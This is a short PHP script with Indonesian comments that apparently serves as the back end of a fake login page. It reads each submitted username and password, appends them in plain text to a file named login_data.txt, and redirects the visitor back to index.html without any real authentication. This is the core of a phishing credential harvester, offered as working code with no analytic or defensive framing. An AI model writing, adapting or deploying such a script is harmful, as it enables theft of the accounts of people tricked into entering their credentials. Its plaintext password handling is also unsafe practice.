<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Buat string data yang akan disimpan ke dalam file teks
    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";

    // Buka file teks untuk menambahkan data login
    $file = fopen("login_data.txt", "a");

    // Tulis data login ke dalam file teks
    fwrite($file, $data);

    // Tutup file teks setelah selesai menulis
    fclose($file);

    // Beri respon kembali ke halaman login
    header("Location: index.html");
    exit();
}
?>
